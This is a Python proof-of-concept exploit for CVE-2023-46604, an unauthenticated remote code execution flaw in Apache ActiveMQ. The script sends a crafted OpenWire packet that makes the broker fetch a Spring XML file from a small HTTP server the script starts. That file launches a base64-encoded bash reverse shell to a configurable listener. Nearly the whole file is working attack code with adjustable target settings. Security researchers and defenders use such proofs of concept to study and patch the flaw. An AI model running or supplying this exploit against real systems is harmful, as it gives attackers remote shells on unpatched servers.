#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Apache ActiveMQ <= 5.15.15 - Unauthenticated RCE
# By: https://github.com/kazzarahw
# Ref: https://activemq.apache.org/security-advisories.data/CVE-2023-46604

# I know it's not async but I don't care. It's just a PoC.
# Only for Linux servers rn but it should be easy enough to convert for a Windows machine
# You'd really just have to change the cmd encoding/cradle

# Imports
import socket
import base64

# Config
server_ip = "127.0.0.1" # Ip for local server hosting xml file
server_port = 8000 # Port for local server hosting xml file
target_ip = "127.0.0.1" # Ip for target server
target_port = 61616 # Port for target server (ActiveMQ OpenWire transport)
cmd = "/bin/bash -i >& /dev/tcp/127.0.0.1/10001 0>&1"

# XML/CMD Setup
cmd_enc = base64.b64encode(cmd.encode()).decode()
xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
	<bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
		<constructor-arg>
			<list>
				<value>bash</value>
				<value>-c</value>
				<value>echo {cmd_enc}|base64 -d|bash</value>
			</list>
		</constructor-arg>
	</bean>
</beans>"""
xml_bytes = xml.encode()

# Payload Setup
class_name = "org.springframework.context.support.ClassPathXmlApplicationContext"
class_name_hex = class_name.encode().hex()
class_name_header = format(len(class_name), "04x")
server_url = "http://" + server_ip + ":" + str(server_port) + "/x.xml"
server_url_hex = server_url.encode().hex()
server_url_header = format(len(server_url), "04x")
header = "1f00000000000000000001"
body = header + "01" + class_name_header + class_name_hex + "01" + server_url_header + server_url_hex
body_header = format(len(body) // 2, "08x")
payload = body_header + body
payload_bytes = bytes.fromhex(payload)
print(f"Payload: {payload}")

# HTTP Setup
headers = f"""HTTP/1.0 200 OK\r
Content-Type: text/xml\r
Content-Length: {len(xml_bytes)}\r
\r
"""
headers_bytes = headers.encode("utf-8")
http_response = headers_bytes + xml_bytes

# Start HTTP Server
print("HTTP: Starting...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Start using socket because SimpleHTTP was being a pain
s.bind((server_ip, server_port))
s.listen(1)

# Send Payload
print("Payload: Sending...")
conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn.connect((target_ip, target_port))
conn.send(payload_bytes)
conn.close()
print("Payload: Sent!")

# Send XML
for _ in range(2): # Server requests file twice, not sure why, doesn't work without
	conn, addr = s.accept()
	conn.send(http_response)
	conn.close()
	print(f"HTTP: XML sent to {addr[0]}!")
s.close()
